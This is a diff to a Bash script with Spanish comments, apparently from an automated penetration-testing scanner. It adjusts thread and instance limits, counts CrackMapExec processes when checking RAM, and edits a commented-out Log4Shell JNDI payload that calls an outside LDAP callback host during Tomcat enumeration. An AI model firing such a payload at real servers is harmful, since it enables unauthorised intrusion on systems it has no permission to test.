@@ -79,20 +79,22 @@ done
 eval set -- "$PARAMS"
 
 MIN_RAM=900;
-MAX_SCRIPT_INSTANCES=80
 hilos_web=10
 webScaneado=0 # para saber si escaneo algun sitio web
 
 if [[  ${SPEED} == "1" ]]; then
 	hilos_web=1
+	MAX_SCRIPT_INSTANCES=10
+
 fi
 if [[  ${SPEED} == "2" ]]; then
-	hilos_web=5
+	hilos_web=3
+	MAX_SCRIPT_INSTANCES=30
 fi
 if [[  ${SPEED} == "3" ]]; then
-	hilos_web=10
+	hilos_web=9
+	MAX_SCRIPT_INSTANCES=90
 fi
-
 
 echo "hilos_web $hilos_web"
 
@@ -207,7 +209,7 @@ function insert_data () {
 function checkRAM (){
 	while true; do
 		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
-		script_instancias=$((`ps aux | egrep 'webData|passWeb' | wc -l` - 1)) 
+		script_instancias=$((`ps aux | egrep 'webData|passWeb|crackmap' | wc -l` - 1)) 
 		python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1)) 
 		script_instancias=$((script_instancias + python_instancias))
 
@@ -215,6 +217,7 @@ function checkRAM (){
 			break
 		else	
 			echo "Poca RAM $MIN_RAM MB ($script_instancias scripts activos)"
+			sleep 3 
 		fi
 	done
 }
@@ -1407,7 +1410,7 @@ for line in $(cat $TARGETS); do
 					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
 						checkRAM
 						enumeracionTomcat "$proto_http" $host $port																							
-						#  ${jndi:ldap://2l5ty4b5.requestrepo.com/wut7lcz}
+						#  ${jndi:ldap://z4byndtm.requestrepo.com/wut7lcz}   #log4shell
 					fi									
 					####################################
 
